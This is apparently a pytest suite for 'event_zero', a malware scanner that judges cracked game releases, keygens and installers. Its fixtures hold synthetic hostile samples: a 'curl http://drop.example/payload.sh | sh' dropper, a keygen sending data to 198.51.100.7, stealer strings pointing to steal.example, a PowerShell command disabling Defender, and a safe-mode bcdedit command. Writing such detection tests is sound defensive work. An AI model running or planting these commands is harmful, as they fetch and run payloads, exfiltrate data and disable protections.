import hashlib, json, os, struct, subprocess, sys, zipfile, zlib
import pytest
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from event_zero.verdict import verdict, verdict_to_text, malicious_chains, scope_test
from event_zero.validate import validate_verdict
from event_zero.analyzer import analyze
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def write(tmp, name, data, sub=""):
    d = os.path.join(str(tmp), sub) if sub else str(tmp)
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, name)
    with open(p, "wb" if isinstance(data, bytes) else "w") as f:
        f.write(data)
    return p

def pe_with_body(body, extra_strings=b"", section=b".text"):
    dos = bytearray(0x80); dos[0:2] = b"MZ"; struct.pack_into("<I", dos, 0x3c, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 240, 0x22)
    opt = bytearray(240); struct.pack_into("<H", opt, 0, 0x20b); struct.pack_into("<I", opt, 16, 0x1000)
    sec = bytearray(40); sec[0:len(section)] = section; struct.pack_into("<IIII", sec, 8, 100, 0x1000, 512, 512)
    b = (body + extra_strings).ljust(512, b"\x00")
    return bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + bytes(sec) + b

ORIGINAL_PROG = 'KEY = "AAAA-1234"\n\ndef main():\n    key = input("license key: ")\n    if key == KEY:\n        print("welcome, licensed user")\n    else:\n        print("license check failed")\n\nmain()\n'
PATCHED_PROG = ORIGINAL_PROG.replace('if key == KEY:', 'if True:  # license check patched')

STEALER_DLL = pe_with_body(b"\x90" * 8, b"Login Data\x00password\x00http://steal.example/collect\x00")
DROPPER = 'import os\nos.system("curl http://drop.example/payload.sh | sh")\n'
KEYGEN_CLEAN = 'import hashlib, random\n# keygen: generate a serial key for the program\ndef make_key():\n    seed = random.randint(1000, 9999)\n    return "KEY-" + hashlib.md5(str(seed).encode()).hexdigest()[:8].upper()\nprint("serial:", make_key())\n'
KEYGEN_EXFIL = 'import socket, hashlib\n# keygen that also phones home\ndef make_key():\n    return "KEY-" + hashlib.md5(b"x").hexdigest()[:8]\ns = socket.socket()\ns.connect(("198.51.100.7", 9001))\ns.send(make_key().encode())\nprint(make_key())\n'

def make_release(tmp):
    ref = os.path.join(str(tmp), "genuine"); rel = os.path.join(str(tmp), "release")
    os.makedirs(ref); os.makedirs(rel)
    write(tmp, "game.py", ORIGINAL_PROG, "genuine")
    write(tmp, "game.py", PATCHED_PROG, "release")
    return ref, rel

# 1. benign program + license patch, with reference = NO, diff explained
def test_no_benign_patched_with_reference(tmp_path):
    ref, rel = make_release(tmp_path)
    v = verdict(rel, reference=ref)
    assert v["headline"] == "NO: NO MALWARE" and v["reason_class"] == "ACCOUNTED"
    assert v["diff_ledger"] and all(le["classification"] in ("expected-crack", "benign-repack") for le in v["diff_ledger"])
    assert any("Every byte is accounted for" in p for p in v["plain_english"])
    ok, problems = validate_verdict(v)
    assert ok, problems

# 2. same release + hidden stealer DLL in a zip = YES PROVEN naming the DLL
def test_yes_hidden_stealer_dll_in_zip(tmp_path):
    ref, rel = make_release(tmp_path)
    zpath = os.path.join(str(tmp_path), "release.zip")
    with zipfile.ZipFile(zpath, "w") as z:
        z.writestr("game.py", PATCHED_PROG)
        z.writestr("helper.dll", STEALER_DLL)
    v = verdict(zpath, reference=ref)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    assert any("helper.dll" in y["file"] for y in v["yes_reasons"])
    assert v["installer"]["is_installer_or_archive"] and "helper.dll" in " ".join(v["installer"]["drop_list"])

# 3a. keygen that only generates keys = NO
def test_no_keygen_only_generates_keys(tmp_path):
    p = write(tmp_path, "keygen.py", KEYGEN_CLEAN)
    v = verdict(p)
    assert v["headline"] == "NO: NO MALWARE", v["plain_english"]
    assert v["files"][0]["claimed_function"] == "keygen"

# 3b. keygen with socket exfil = YES PROVEN via the scope test
def test_yes_keygen_scope_test_network(tmp_path):
    p = write(tmp_path, "keygen.py", KEYGEN_EXFIL)
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    assert any(y["chain"] == "scope-test" for y in v["yes_reasons"]), [y["chain"] for y in v["yes_reasons"]]

# 4. installer-like zip with a dropper script = YES PROVEN
def test_yes_installer_zip_dropper(tmp_path):
    zpath = os.path.join(str(tmp_path), "setup.zip")
    with zipfile.ZipFile(zpath, "w") as z:
        z.writestr("readme.txt", "run setup.py to install")
        z.writestr("setup.py", DROPPER)
    v = verdict(zpath)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    assert any("setup.py" in y["file"] for y in v["yes_reasons"])

# 5. clean release, one file virtualized = YES UNACCOUNTED
def test_yes_unaccounted_virtualized_file(tmp_path):
    rel = os.path.join(str(tmp_path), "release"); os.makedirs(rel)
    write(tmp_path, "notes.txt", "just a game, honest", "release")
    write(tmp_path, "game.exe", pe_with_body(b"\x90" * 8, b"VMProtect\x00", section=b".vmp0"), "release")
    v = verdict(rel)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"
    assert any("virtualiz" in u.lower() for u in v["unaccounted"])

# 6. tampered diff, unexplained code addition, no malicious caps = YES UNACCOUNTED
def test_yes_unaccounted_unexplained_diff(tmp_path):
    ref, rel = make_release(tmp_path)
    tampered = PATCHED_PROG + "\n# extra block\n" + "".join(f"data_{i} = {i} * {i} + 7  # filler line {i}\n" for i in range(30))
    write(tmp_path, "game.py", tampered, "release")
    v = verdict(rel, reference=ref)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED", v["diff_ledger"]
    assert any(le["classification"] == "unaccounted" for le in v["diff_ledger"])

# 7. single cracked binary, clean = NO (patch identified from the file itself)
def test_no_single_cracked_binary(tmp_path):
    body = b"\x90" * 12 + b"\x31\xc0\xc3" * 4
    p = write(tmp_path, "game_crack.exe", pe_with_body(body, b"license check\x00cracked\x00"))
    v = verdict(p)
    assert v["headline"] == "NO: NO MALWARE", v["files"][0]["why"]
    assert v["files"][0]["patch_evidence"]

# 8. single binary with embedded hidden payload = YES PROVEN
def test_yes_single_binary_embedded_payload(tmp_path):
    inner = pe_with_body(b"\x90" * 4, b"Login Data\x00password\x00http://steal.example/x\x00")
    outer = pe_with_body(b"\x90" * 12 + inner, b"license check\x00")
    p = write(tmp_path, "game_crack.exe", outer)
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    assert v["files"][0]["embedded_payloads"]

# 9. single virtualized binary = YES UNACCOUNTED
def test_yes_unaccounted_single_virtualized(tmp_path):
    p = write(tmp_path, "game_crack.exe", pe_with_body(b"\x90" * 8, b"VMProtect\x00license\x00", section=b".vmp0"))
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"

# 10. AV tampering is PROVEN class (Crackonosh pattern)
def test_yes_av_tampering_proven(tmp_path):
    script = 'import os\n# setup helper\nos.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")\n'
    p = write(tmp_path, "setup.py", script)
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    assert any(y["chain"] == "scope-test" for y in v["yes_reasons"]), [y["chain"] for y in v["yes_reasons"]]

# 11. reboot-count gating + Safe Mode manipulation are PROVEN class
def test_yes_reboot_gating_and_safe_mode(tmp_path):
    script = 'import os\ncfg = "RebootCount=41"\nos.system("bcdedit /set {default} safeboot minimal")\nprint(cfg)\n'
    p = write(tmp_path, "updater.py", script)
    v = verdict(p)
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"

# 12. headline discipline: only two headlines, timing present, ELI5 first in text
def test_headline_discipline_and_timing(tmp_path):
    p = write(tmp_path, "keygen.py", KEYGEN_CLEAN)
    v = verdict(p)
    assert v["headline"] in ("YES: MALWARE FOUND", "NO: NO MALWARE")
    assert isinstance(v["elapsed_seconds"], (int, float)) and v["elapsed_seconds"] < 120
    t = verdict_to_text(v)
    assert t.index("EXPLAINED LIKE YOU ARE FIVE") < t.index("PER-FILE TABLE")
    assert "NO VERDICT" not in t

# 13. known-bad hash injection = YES PROVEN
def test_yes_known_bad_hash(tmp_path):
    p = write(tmp_path, "tool.py", KEYGEN_CLEAN)
    sha = hashlib.sha256(KEYGEN_CLEAN.encode()).hexdigest()
    v = verdict(p, known_bad={sha: "TestFamily (synthetic test entry)"})
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "PROVEN"
    assert any(y["chain"] == "known-bad-hash" for y in v["yes_reasons"])

# 14. reference manifest equality: NO requires hash equality
def test_reference_manifest_equality(tmp_path):
    ref, rel = make_release(tmp_path)
    sha = hashlib.sha256(PATCHED_PROG.encode()).hexdigest()
    man = write(tmp_path, "genuine.sha256", f"{sha}  game.py\n")
    v = verdict(rel, reference=man)
    assert v["headline"] == "NO: NO MALWARE", v["unaccounted"]
    bad = write(tmp_path, "game.py", PATCHED_PROG + "\n# changed\n", "release2")
    rel2 = os.path.join(str(tmp_path), "release2")
    v2 = verdict(rel2, reference=man)
    assert v2["headline"] == "YES: MALWARE FOUND" and v2["reason_class"] == "UNACCOUNTED"

# 15. provenance: a claimed scene group site is fraudulent by construction
def test_provenance_scene_group_site(tmp_path):
    rel = os.path.join(str(tmp_path), "release"); os.makedirs(rel)
    write(tmp_path, "readme.txt", "CODEX official site: https://codex-games.example.com download here", "release")
    write(tmp_path, "keygen.py", KEYGEN_CLEAN, "release")
    v = verdict(rel)
    assert v["provenance"], "expected a provenance finding"
    assert v["headline"] == "YES: MALWARE FOUND" and v["reason_class"] == "UNACCOUNTED"

# 16. CLI: one command, headline immediately in output
def test_cli_verdict(tmp_path):
    p = write(tmp_path, "keygen.py", KEYGEN_EXFIL)
    r = subprocess.run([sys.executable, "-m", "event_zero", "verdict", p], capture_output=True, text=True, cwd=ROOT)
    assert r.returncode == 0, r.stderr
    assert "YES: MALWARE FOUND" in r.stdout

# 17. KMS baseline: local emulator + renewal task is expected crack, not malware
def test_kms_baseline_expected(tmp_path):
    script = ('# KMS activator: local emulator on port 1688, GVLK key, renewal task\n'
              'import os\n'
              'os.system("slmgr /ipk XXXXX-XXXXX-XXXXX-XXXXX-XXXXX")\n'
              'os.system("schtasks /create /tn KMSRenewal /sc daily /tr kms_emulator.exe")\n'
              'print("KMS emulator listening on 127.0.0.1 port 1688")\n')
    p = write(tmp_path, "kms_activator.py", script)
    v = verdict(p)
    assert v["headline"] == "NO: NO MALWARE", v["yes_reasons"]

# 18. scope test unit: network for a keygen is a violation, key generation alone is not
def test_scope_test_unit(tmp_path):
    clean = analyze(write(tmp_path, "keygen.py", KEYGEN_CLEAN))
    hits, claimed = scope_test(clean, "keygen.py")
    assert claimed == "keygen" and hits == []
    bad = analyze(write(tmp_path, "keygen2.py", KEYGEN_EXFIL))
    hits2, _ = scope_test(bad, "keygen2.py")
    assert hits2 and any("network" in h["behaviour"] for h in hits2)
